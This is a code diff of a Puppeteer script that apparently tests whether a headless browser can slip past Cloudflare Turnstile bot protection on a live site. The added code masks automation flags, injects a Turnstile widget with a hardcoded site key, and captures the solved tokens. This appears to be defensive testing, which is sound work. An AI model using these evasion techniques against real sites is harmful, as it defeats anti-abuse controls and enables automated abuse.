@@ -268,7 +268,12 @@ async function main() {
       '--disable-setuid-sandbox',
       '--disable-blink-features=AutomationControlled',
       '--window-size=1280,720',
+      // Try to look more like a real browser
+      '--disable-extensions-except=',
+      '--enable-features=NetworkService,NetworkServiceInProcess',
     ],
+    // Skip default DevTools protocol flags that leak automation
+    ignoreDefaultArgs: ['--enable-automation'],
   });
 
   const page = await browser.newPage();
@@ -277,32 +282,83 @@ async function main() {
     'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
   );
 
-  // Navigate to the live site
+  // Navigate to the live site (for domain context — Turnstile validates origin)
   console.log(`[2] Loading ${SITE_URL}...`);
   await page.goto(SITE_URL, { waitUntil: 'networkidle2', timeout: 30_000 });
+
+  // Dismiss the welcome modal if present
+  console.log('[3] Dismissing welcome modal...');
+  try {
+    await page.evaluate(() => {
+      const buttons = [...document.querySelectorAll('button')];
+      const gotIt = buttons.find(b => b.textContent?.trim().toUpperCase().includes('GOT IT'));
+      if (gotIt) gotIt.click();
+    });
+    await new Promise(r => setTimeout(r, 1000));
+    console.log('  done');
+  } catch {
+    console.log('  no modal found, continuing');
+  }
 
   // Inject token capture hooks
   const turnstile = new TurnstileManager(page);
   await turnstile.inject();
 
-  // Debug: check what Turnstile elements are on the page
-  console.log('[3] Checking Turnstile status on page...');
+  // Programmatically render a Turnstile widget on the page
+  // An attacker knows the site key (it's in the public JS bundle)
+  // and can render the widget themselves on the legitimate domain
+  console.log('[4] Injecting Turnstile widget...');
+  await page.evaluate((sitekey) => {
+    // Create a container for our widget
+    const div = document.createElement('div');
+    div.id = 'bot-turnstile';
+    document.body.appendChild(div);
+
+    // Wait for the Turnstile API to load (it's already in the page's scripts)
+    function tryRender() {
+      if (typeof turnstile !== 'undefined') {
+        turnstile.render('#bot-turnstile', {
+          sitekey,
+          callback: (token) => {
+            window.__botToken = token;
+            window.__botTokenTime = Date.now();
+            window.__botSolveCount++;
+          },
+          'expired-callback': () => {
+            window.__botToken = null;
+          },
+        });
+      } else {
+        setTimeout(tryRender, 500);
+      }
+    }
+    tryRender();
+  }, '0x4AAAAAACV0UOMmCeG_g2Jr');
+
+  // Debug
+  await new Promise(r => setTimeout(r, 2000));
+  console.log('[5] Checking Turnstile status...');
   const status = await turnstile.debugStatus();
   console.log('  debug:', JSON.stringify(status));
 
   // Wait for Turnstile to solve
-  console.log('[4] Waiting for Turnstile to solve (60s timeout)...');
+  console.log('[6] Waiting for Turnstile to solve (60s timeout)...');
   const initialToken = await turnstile.waitForToken(60_000);
   if (!initialToken) {
     const finalStatus = await turnstile.debugStatus();
     console.error('  FAILED: Turnstile did not solve within 60s.');
     console.error('  final debug:', JSON.stringify(finalStatus));
-    console.error('  This means Turnstile detected the headless browser!');
-    console.log('\nVERDICT: Headless browser was DETECTED by Turnstile. Attack blocked at token acquisition.');
 
     // Take screenshot for analysis
     await page.screenshot({ path: '/tmp/turnstile-fail.png', fullPage: true });
     console.log('  screenshot saved to /tmp/turnstile-fail.png');
+
+    // Check if Turnstile rendered at all vs detected bot
+    if (!finalStatus.hasIframe && !finalStatus.hasWidget) {
+      console.log('\nVERDICT: Turnstile API never loaded. The site may block script injection.');
+    } else {
+      console.log('\nVERDICT: Headless browser was DETECTED by Turnstile. Attack blocked at token acquisition.');
+    }
 
     await browser.close();
     process.exit(1);
